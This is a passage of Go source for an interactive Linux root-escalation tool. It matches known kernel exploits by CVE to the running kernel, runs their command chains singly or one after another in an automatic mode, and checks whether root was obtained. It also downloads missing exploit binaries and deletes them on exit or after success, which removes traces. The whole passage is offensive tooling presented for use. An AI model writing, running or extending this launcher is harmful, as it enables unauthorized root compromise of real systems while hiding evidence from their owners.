	fmt.Printf("  \033[1;32m[+]\033[0m Selected: %s (%s)\n\033[0m", e.name, e.cve)
	if e.requires != "" {
		fmt.Printf("  \033[1;33m[!]\033[0m Prerequisites: %s\n", e.requires)
	}
	fmt.Print("\033[1;36m  [*] Running exploit...\033[0m\n\n")
	fmt.Println("  ------------------------------------------------------------")

	var exitCode int
	chains := e.runChain()
	for ci, argv := range chains {
		if e.bgFirst && ci == 0 {
			fmt.Printf("  \033[1;36m[*]\033[0m Starting in background: %s\n", strings.Join(argv, " "))
			cmd := exec.Command(argv[0], argv[1:]...)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			if err := cmd.Start(); err != nil {
				fmt.Printf("  \033[1;31m[-]\033[0m Background start failed: %v\n", err)
				return -1
			}
			// Give daemons (fuse, etc.) a moment to settle before the next step.
			time.Sleep(1 * time.Second)
			continue
		}
		fmt.Printf("  \033[1;36m[*]\033[0m Step %d/%d: %s\n", ci+1, len(chains), strings.Join(argv, " "))
		cmd := exec.Command(argv[0], argv[1:]...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err := cmd.Run()

		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				// ExitCode() is cross-platform (replaces unix.WaitStatus).
				exitCode = exitErr.ExitCode()
			} else {
				exitCode = -1
			}
		} else {
			exitCode = 0
		}

		if isRoot() {
			return 0
		}

		if exitCode == 0 && !isRoot() {
			fmt.Printf("  \033[1;33m[!]\033[0m Exploit reported success but we're not root (false positive)\n\033[0m")
			return -1
		}
		if exitCode != 0 {
			// Stop the chain as soon as a foreground step fails.
			return exitCode
		}
	}

	return exitCode
}

func autoRun(kernelMatched bool) {
	var exploitList []int
	var desc string

	if kernelMatched && len(matchedExploits) > 0 {
		exploitList = matchedExploits
		desc = "kernel-matched"
		fmt.Print("\033[1;32m  [*] Auto-exploitation mode (KERNEL-MATCHED)\033[0m\n")
	} else {
		for i := range exploits {
			if exploits[i].viable {
				exploitList = append(exploitList, i)
			}
		}
		desc = "viable"
		fmt.Print("\033[1;32m  [*] Auto-exploitation mode (ALL VIABLE)\033[0m\n")
	}

	fmt.Printf("\033[1;36m  [*] Will try %d %s exploits in order...\033[0m\n\n", len(exploitList), desc)
	fmt.Print("\033[1;33m  [!] Note: Some exploits may hang or crash. Press Ctrl+C to skip.\033[0m\n\n")

	for count, idx := range exploitList {
		fmt.Printf("\033[1;36m  [%d/%d] Trying: %s (%s)...\033[0m\n",
			count+1, len(exploitList), exploits[idx].name, exploits[idx].cve)

		result := runExploit(idx)

		if result == 0 {
			fmt.Print("\033[1;32m\n  [+] SUCCESS! Exploit worked - you should be root now.\033[0m\n")
			// Root obtained: leave the menu, wipe downloaded binaries on the way out.
			cleanupDownloaded()
			return
		}
		fmt.Print("\033[1;33m  [-] Failed. Moving to next exploit...\033[0m\n\n")

		time.Sleep(500 * time.Millisecond)
	}

	fmt.Print("\033[1;31m  [-] All exploits failed. System may be fully patched.\033[0m\n")
	cleanupDownloaded()
}

func showInfo() {
	clearScreen()
	fmt.Print("\033[1;37m  EXPLOIT INFORMATION\033[0m\n")
	fmt.Println("  " + strings.Repeat("-", uiWidth-4))
	fmt.Printf("  Current Kernel: \033[1;32m%s\033[0m\n\n", kernelVersion)

	for i := range exploits {
		marker := "  "
		if exploits[i].matched {
			marker = "\033[1;32m*\033[0m"
		}

		fmt.Printf("  %s \033[1;36m[%d] %s - %s\033[0m\n", marker, i+1, exploits[i].name, exploits[i].cve)
		fmt.Printf("        Binary: %s | Size: %s\n", exploits[i].binary, exploits[i].size)
		fmt.Printf("        Kernel Range: %s - %s\n", exploits[i].kernel.min, exploits[i].kernel.max)
		if exploits[i].kernel.notes != "" {
			fmt.Printf("        Notes: %s\n", exploits[i].kernel.notes)
		}

		if exploits[i].viable {
			if exploits[i].matched {
				fmt.Print("        Status: \033[1;32m[+] Viable (Kernel Matched)\033[0m\n")
			} else {
				fmt.Print("        Status: \033[1;32m[+] Viable (Different kernel)\033[0m\n")
			}
		} else if !fileExists(exploits[i].binary) {
			fmt.Print("        Status: \033[1;31m[-] Binary not found\033[0m\n")
		} else {
			fmt.Print("        Status: \033[1;31m[-] Requirements not met\033[0m\n")
		}
		fmt.Println()
	}

	fmt.Println("  " + strings.Repeat("-", uiWidth-4))
	fmt.Print("\n  Press Enter to return to menu...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func main() {
	if len(os.Args) > 0 {
		dir := filepath.Dir(os.Args[0])
		if dir != "." && dir != "" {
			if err := os.Chdir(dir); err != nil {
				fmt.Fprintf(os.Stderr, "chdir: %v\n", err)
			}
		}
	}

	// Ctrl+C / SIGTERM: wipe downloaded binaries before dying. os.Exit skips
	// defers, so the handler runs the cleanup itself before exiting.
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		cleanupDownloaded()
		os.Exit(130)
	}()

	initExploits()
	// Covers every normal exit path: quit [00], root obtained, all exploits
	// failed, no viable exploits, EOF on stdin. Idempotent with explicit calls.
	defer cleanupDownloaded()
	printHeader()
	printSystemInfo()
	analyzeExploits()

	totalViable := 0
	for i := range exploits {
		if exploits[i].viable {
			totalViable++
		}
	}

	if totalViable == 0 {
		fmt.Printf("  \033[1;31m[-]\033[0m No viable exploits found for this system.\n\033[0m")
		return
	}

	scanner := bufio.NewScanner(os.Stdin)
	for {
		showMenu()
		fmt.Print("\033[1;36m  > choice:\033[0m ")
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		input = strings.ToLower(input)

		if input == "00" {
			fmt.Print("\033[1;36m  [*] Exiting...\033[0m\n")
			break
		}

		if input == "d" {
			autoDownloadMissing()
			continue
		}

		if input == "99" {
			showInfo()
			clearScreen()
			printHeader()
			printSystemInfo()
			analyzeExploits()
			continue
		}

		choice, err := strconv.Atoi(input)
		if err != nil {
			fmt.Print("  \033[1;31m[-] Invalid choice\033[0m\n\n")
			continue
		}
		fmt.Println()

		if viableCount > 0 {
			if choice == 0 {
				autoRun(true)
				break
			} else if choice == 1 {
				autoRun(false)
				break
			} else if choice >= 2 && choice <= len(exploits)+1 {
				idx := choice - 2
				if !exploits[idx].viable {
					fmt.Print("  \033[1;31m[-] Exploit not viable\033[0m\n\n")
					continue
				}
				runExploit(idx)
				break
			} else {
				fmt.Print("  \033[1;31m[-] Invalid choice\033[0m\n\n")
			}
		} else {
			if choice == 0 {
				autoRun(false)
				break
			} else if choice >= 1 && choice <= len(exploits) {
				idx := choice - 1
				if !exploits[idx].viable {
					fmt.Print("  \033[1;31m[-] Exploit not viable\033[0m\n\n")
					continue
				}
				runExploit(idx)
				break
			} else {
				fmt.Print("  \033[1;31m[-] Invalid choice\033[0m\n\n")
			}
		}
	}
}
